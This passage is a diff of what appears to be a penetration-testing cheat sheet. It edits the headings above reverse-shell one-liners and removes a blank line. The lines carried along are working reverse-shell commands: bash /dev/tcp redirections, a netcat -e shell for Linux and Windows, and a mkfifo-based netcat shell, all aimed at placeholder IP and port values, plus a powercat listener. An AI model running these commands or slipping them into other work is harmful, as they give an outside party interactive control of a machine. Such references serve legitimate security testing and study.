@@ -216,7 +216,7 @@ powercat -l -p 443 -ep
 
 #### One-liners reverse shell
 
-###### Bash
+###### [Linux] Bash
 
 ```bash
 bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
@@ -225,7 +225,7 @@ exec /bin/sh 0</dev/tcp/<IP>/<PORT> 1>&0 2>&0
 0<&196;exec 196<>/dev/tcp/<IP>/<PORT>; sh <&196 >&196 2>&196
 ```
 
-###### Netcat
+###### [Linux / Windows] Netcat
 
 ```
 # If nc e option available:
@@ -233,7 +233,6 @@ nc -e /bin/sh <IP> <PORT> &
 # The ncat.exe from https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe offers a better compatibility across Windows systems
 nc.exe -e cmd.exe <IP> <PORT>
 nc64.exe -e cmd.exe <IP> <PORT>
-
 
 # Else (Linux):
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f
